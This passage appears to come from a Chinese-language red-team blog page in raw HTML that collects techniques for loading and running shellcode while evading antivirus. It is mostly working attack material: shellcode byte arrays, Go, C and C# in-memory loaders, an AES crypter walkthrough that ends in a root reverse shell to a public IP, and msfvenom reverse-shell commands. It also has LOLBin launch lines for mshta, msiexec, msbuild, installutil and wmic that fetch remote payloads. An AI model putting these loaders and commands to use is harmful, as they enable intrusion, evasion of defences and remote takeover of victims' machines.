class="string">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span></span><br></pre></td></tr></table></figure>

<p>需要64位gcc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;C&quot;</span></span><br><span class="line">import <span class="string">&quot;unsafe&quot;</span></span><br><span class="line"></span><br><span class="line">func <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">    buf := <span class="string">&quot;&quot;</span></span><br><span class="line">    buf += <span class="string">&quot;xddxc6xd9x74x24xf4x5fx33xc9xb8xb3x5ex2c&quot;</span></span><br><span class="line">    ...</span><br><span class="line">    buf += <span class="string">&quot;xc9xb1x97x31x47x1ax03x47x1ax83xc7x04xe2&quot;</span></span><br><span class="line">    shellcode := []byte(buf)</span><br><span class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要调用c语言代码，待完善</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9iYXN0ZW5nYW8uY29tL2Jsb2cvMjAxNy8xMi9nby1jZ28tYy5odG1s">在 Go 语言中调用 C 代码<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="go-AES-shellcode-success"><a href="#go-AES-shellcode-success" class="headerlink" title="go-AES-shellcode (success)"></a>go-AES-shellcode (success)</h3><p><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL3N5c2NhbGw1OS9hLXRyaW5pdHktb2Ytc2hlbGxjb2RlLWFlcy1nby1mNmNlYzg1NGY5OTI=">A Trinity of Shellcode, AES &amp; Golang<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsYW52aXZvbmEvcHduc2hvcC90cmVlL21hc3Rlci9zcmMvMHgxNC1TTEFFNjQtY3J5cHRlcg==">0x14-SLAE64-crypter<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li>windows上面编译gocrypter报错：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcoderun\shellcoderun.go:5:10: fatal error: sys/mman.h: No such file or directory</span><br></pre></td></tr></table></figure>

<p>原因：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sys/mman.h&gt;是一个unix头文件，在windows上不可用</span><br></pre></td></tr></table></figure>

<ul>
<li>linux上编译(只能在linux机器上弹shell)</li>
</ul>
<p>编译成功</p>
<p>生成payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=45.32.137.154 LPORT=2344 &gt; gocryptpayload</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/go-crypter<span class="comment"># cat gocryptpayload | xxd</span></span><br><span class="line">00000000: 6a29 5899 6a02 5f6a 015e 0f05 4897 48b9  j)X.j._j.^..H.H.</span><br><span class="line">00000010: 0200 0928 2d20 899a 5148 89e6 6a10 5a6a  ...(- ..QH..j.Zj</span><br><span class="line">00000020: 2a58 0f05 6a03 5e48 ffce 6a21 580f 0575  *X..j.^H..j!X..u</span><br><span class="line">00000030: f66a 3b58 9948 bb2f 6269 6e2f 7368 0053  .j;X.H./bin/sh.S</span><br><span class="line">00000040: 4889 e752 5748 89e6 0f05                 H..RWH....</span><br></pre></td></tr></table></figure>

<p>aes加密payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/go-crypter<span class="comment"># ./go-crypter encrypt &quot;lucifer110000000&quot; gocryptpayload</span></span><br><span class="line">Reading from file at gocryptpayload</span><br><span class="line">Input size is: 74 bytes</span><br><span class="line">Key size is: 16 bytes</span><br><span class="line">Calling encrypt...</span><br><span class="line">Result size is: 96 bytes</span><br><span class="line">Saved to gocrypter.111526.out</span><br><span class="line">root@kali:~/go-crypter<span class="comment"># cat gocrypter.111526.out | xxd</span></span><br><span class="line">00000000: aab9 7c35 31e4 b4ba d0a0 2551 44ec 373d  ..|51.....%QD.7=</span><br><span class="line">00000010: c3da 0026 ba7c bb5a 11d8 4b73 41bf bf50  ...&amp;.|.Z..KsA..P</span><br><span class="line">00000020: dce1 64a8 bf65 712a fba4 5e04 0780 3b8f  ..d..eq*..^...;.</span><br><span class="line">00000030: 56ac 1f9b cf98 db99 edc6 6a95 dbb1 b538  V.........j....8</span><br><span class="line">00000040: aebf 740e 93ca cda6 42ec ebf7 d1a9 56c2  ..t.....B.....V.</span><br><span class="line">00000050: 9517 b1ac fd51 c14b 28ad 886c beb8 a0f8  .....Q.K(..l....</span><br></pre></td></tr></table></figure>

<p>解密payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/go-crypter<span class="comment"># ./go-crypter decrypt &quot;lucifer110000000&quot; gocrypter.111526.out</span></span><br><span class="line">Reading from file at gocrypter.111526.out</span><br><span class="line">Input size is: 96 bytes</span><br><span class="line">Key size is: 16 bytes</span><br><span class="line">Calling decrypt...</span><br><span class="line">Result size is: 74 bytes</span><br><span class="line">Saved to gocrypter.111737.out</span><br><span class="line">root@kali:~/go-crypter<span class="comment"># cat gocrypter.111737.out | xxd</span></span><br><span class="line">00000000: 6a29 5899 6a02 5f6a 015e 0f05 4897 48b9  j)X.j._j.^..H.H.</span><br><span class="line">00000010: 0200 0928 2d20 899a 5148 89e6 6a10 5a6a  ...(- ..QH..j.Zj</span><br><span class="line">00000020: 2a58 0f05 6a03 5e48 ffce 6a21 580f 0575  *X..j.^H..j!X..u</span><br><span class="line">00000030: f66a 3b58 9948 bb2f 6269 6e2f 7368 0053  .j;X.H./bin/sh.S</span><br><span class="line">00000040: 4889 e752 5748 89e6 0f05                 H..RWH....</span><br></pre></td></tr></table></figure>

<p>run payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/go-crypter<span class="comment"># ./go-crypter run &quot;lucifer110000000&quot; gocrypter.111526.out</span></span><br><span class="line">Reading from file at gocrypter.111526.out</span><br><span class="line">Input size is: 96 bytes</span><br><span class="line">Key size is: 16 bytes</span><br><span class="line">Calling decrypt...</span><br><span class="line">Result size is: 74 bytes</span><br><span class="line">Calling run...</span><br></pre></td></tr></table></figure>

<p>外网msf  success!!!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type             Information  Connection</span><br><span class="line">  --  ----  ----             -----------  ----------</span><br><span class="line">  1         shell x64/linux               45.32.137.154:2344 -&gt; 182.104.14.146:58604 (182.104.14.146)</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">cli</span><br><span class="line">crypter</span><br><span class="line">go-crypter</span><br><span class="line">gocrypter.111526.out</span><br><span class="line">gocrypter.111737.out</span><br><span class="line">gocrypter.go</span><br><span class="line">gocryptpayload</span><br><span class="line">shellcoderun</span><br></pre></td></tr></table></figure>

<p>使用nc -lvp 2344监听也可以</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">root@kali:/root/go-crypter<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@kali:/root/go-crypter<span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="插入shellcode"><a href="#插入shellcode" class="headerlink" title="插入shellcode"></a>插入shellcode</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;windows.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line">int main (int argc, char **argv) &#123;</span><br><span class="line">  char b[] = &#123;/* 插入经过与<span class="string">&#x27;x&#x27;</span>异或操作后的 shellcode 代码，例如：0x4C,0x4F, 0x4C */&#125;;</span><br><span class="line">  char c[sizeof b];</span><br><span class="line">  <span class="keyword">for</span> (int i = 0; i &lt; sizeof b; i++) &#123;c[i] = b[i] ^ <span class="string">&#x27;x&#x27;</span>;&#125;</span><br><span class="line">  void *<span class="built_in">exec</span> = VirtualAlloc (0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  memcpy (<span class="built_in">exec</span>, c, sizeof c);</span><br><span class="line">  ((void(*)()) <span class="built_in">exec</span>)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CPLResourceRunner"><a href="#CPLResourceRunner" class="headerlink" title="CPLResourceRunner"></a>CPLResourceRunner</h3><p>用Cobalt Strike生成shellcode</p>
<p>Attacks -&gt; Packages -&gt; Windows Executable (s) -&gt; Output &#x3D;&gt; RAW (x86)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> shellcode.txt | sed <span class="string">&#x27;s/[, ]//g; s/0x//g;&#x27;</span> |<span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> | xxd -p -r | gzip -c | <span class="built_in">base64</span> &gt; b64shellcode.txt</span><br></pre></td></tr></table></figure>

<h3 id="powershell加载-MMFml"><a href="#powershell加载-MMFml" class="headerlink" title="powershell加载(MMFml)"></a>powershell加载(MMFml)</h3><p>code:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">namespace mmfExeTwo</span><br><span class="line">&#123;</span><br><span class="line">   using System;</span><br><span class="line">   using System.IO.MemoryMappedFiles;</span><br><span class="line">   using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">   class Program</span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">       private delegate IntPtr NewDelegate();</span><br><span class="line"></span><br><span class="line">       // To handle the location by applying the appropriate <span class="built_in">type</span></span><br><span class="line">       // We had to create a delegate to handle the the pointer to the location <span class="built_in">where</span> we shim <span class="keyword">in</span> the shellcode</span><br><span class="line">       // into the Memory Mapped File.  This allows the location of the opp code to be referenced later <span class="keyword">for</span> execution</span><br><span class="line">       private unsafe static IntPtr <span class="function"><span class="title">GetShellMemAddr</span></span>()</span><br><span class="line">       &#123;</span><br><span class="line">           // 64bit shell code.  Tested on a win10 system.  Injects <span class="string">&quot;cmd -k calc&quot;</span></span><br><span class="line">           // was generated vanilla using <span class="string">&quot;msfvenom -p windows/exec CMD=&quot;</span>cmd /k calc<span class="string">&quot; EXITFUNC=thread C -f powershell&quot;</span></span><br><span class="line">           var shellcode = new byte[]</span><br><span class="line">               &#123;</span><br><span class="line">                    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,</span><br><span class="line">                    0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,</span><br><span class="line">                    0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,</span><br><span class="line">                    0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,</span><br><span class="line">                    0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,</span><br><span class="line">                    0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,</span><br><span class="line">                    0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,</span><br><span class="line">                    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,</span><br><span class="line">                    0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,</span><br><span class="line">                    0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,</span><br><span class="line">                    0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,</span><br><span class="line">                    0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,</span><br><span class="line">                    0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,</span><br><span class="line">                    0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,</span><br><span class="line">                    0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,</span><br><span class="line">                    0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,</span><br><span class="line">                    0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00</span><br><span class="line">               &#125;;</span><br><span class="line"></span><br><span class="line">           MemoryMappedFile mmf = null;</span><br><span class="line">           MemoryMappedViewAccessor viewaccessor = null;</span><br><span class="line"></span><br><span class="line">           try</span><br><span class="line">           &#123;</span><br><span class="line">               /* The try block creates the MMF and assigns the RWE permissions</span><br><span class="line">               The view accessor is created with matching permissions</span><br><span class="line">               the shell code from GetShellMemAddr is written to MMF</span><br><span class="line">               <span class="keyword">then</span> the pointer is gained and a delegate is created to handle pointer value</span><br><span class="line">               so that it can be passed <span class="keyword">in</span> therms of the returned <span class="keyword">function</span> */</span><br><span class="line"></span><br><span class="line">               mmf = MemoryMappedFile.CreateNew(<span class="string">&quot;__shellcode&quot;</span>, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);</span><br><span class="line">               viewaccessor = mmf.CreateViewAccessor(0, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);</span><br><span class="line">               viewaccessor.WriteArray(0, shellcode, 0, shellcode.Length);</span><br><span class="line">               var pointer = (byte*)0;</span><br><span class="line">               viewaccessor.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);</span><br><span class="line">               var func = (NewDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer), typeof(NewDelegate));</span><br><span class="line">               <span class="built_in">return</span> func();</span><br><span class="line">           &#125;</span><br><span class="line">           catch</span><br><span class="line">           &#123;</span><br><span class="line">               <span class="built_in">return</span> IntPtr.Zero;</span><br><span class="line">           &#125;</span><br><span class="line">           finally // You should always clean up after yourself :)</span><br><span class="line">           &#123;</span><br><span class="line">               viewaccessor.Dispose();</span><br><span class="line">               mmf.Dispose();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       static void Main(string[] args)</span><br><span class="line">       &#123;</span><br><span class="line">           GetShellMemAddr();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec CMD=<span class="string">&quot;cmd.exe -c calc.exe&quot;</span> -f csharp</span><br><span class="line"></span><br><span class="line">Invoke-MMFml</span><br></pre></td></tr></table></figure>

<h3 id="Lolbins白利用加载shellcode"><a href="#Lolbins白利用加载shellcode" class="headerlink" title="Lolbins白利用加载shellcode"></a>Lolbins白利用加载shellcode</h3><p>Living-Off-the-Land Binaries(生活在陆地上的二进制)</p>
<ul>
<li>mshta</li>
</ul>
<p>payload:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.174.134 LPORT=53 -f raw &gt; shellcode.bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> shellcode.bin | <span class="built_in">base64</span> -w 0</span><br><span class="line"></span><br><span class="line">mshta.exe http://192.168.174.134/qing.hta</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21kc2VjYWN0aXZlYnJlYWNoL0NBQ1RVU1RPUkNIL21hc3Rlci9DQUNUVVNUT1JDSC5odGE=">替换模板<i class="fa fa-external-link-alt"></i></span></p>
<p>shellcode替换位置:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dim code : code = <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>msiexec</li>
</ul>
<p>加载payload txt:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.174.134 LPORT=4444 -f msi &gt; qing.txt</span><br><span class="line"></span><br><span class="line">C:\Windows\System32\msiexec.exe /q /i http://192.168.174.134 /qing.txt</span><br></pre></td></tr></table></figure>

<p>加载dll:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.174.134 LPORT=53 -f dll &gt; qing.dll</span><br><span class="line"></span><br><span class="line">msiexec /y C:\qing.dll</span><br></pre></td></tr></table></figure>

<ul>
<li>Msbuild</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe qing.xml</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzNnc3R1ZGVudC9tc2J1aWxkLWlubGluZS10YXNr">模板<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li>Installutil</li>
</ul>
<p>编译：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Ente rpriseServices.dll /r:System.IO.Compression.dll /target:library /out:qing.exe /keyfile:C:\Users\John\Desktop\installutil.snk /unsafe C:\Users\John\Desktop\installutil.cs</span><br></pre></td></tr></table></figure>

<p>执行:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= / LogToConsole=<span class="literal">false</span> /U qing.exe</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2hvdy10by1ieXBhc3MtYXBwbGljYXRpb24td2hpdGVsaXN0aW5nLWF2Lw==">详细<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get /FORMAT:<span class="string">&quot;http://example.com/evil.xsl&quot;</span></span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tta3ovU291cmNlcy9tYXN0ZXIvd21pYy1wb2MueHNs">模板<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="csc"><a href="#csc" class="headerlink" title="csc"></a>csc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.174.132 LPORT=53 ‐ f csharp</span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:D:\<span class="built_in">test</span>\InstallUtil-shell.exe D:\<span class="built_in">test</span>\InstallUtil-ShellCode.cs</span><br></pre></td></tr></table></figure>

<p>通过IInstallutil执行即可</p>
<h3 id="C-xor-shellcodewrapper"><a href="#C-xor-shellcodewrapper" class="headerlink" title="C# xor shellcodewrapper"></a>C# xor shellcodewrapper</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 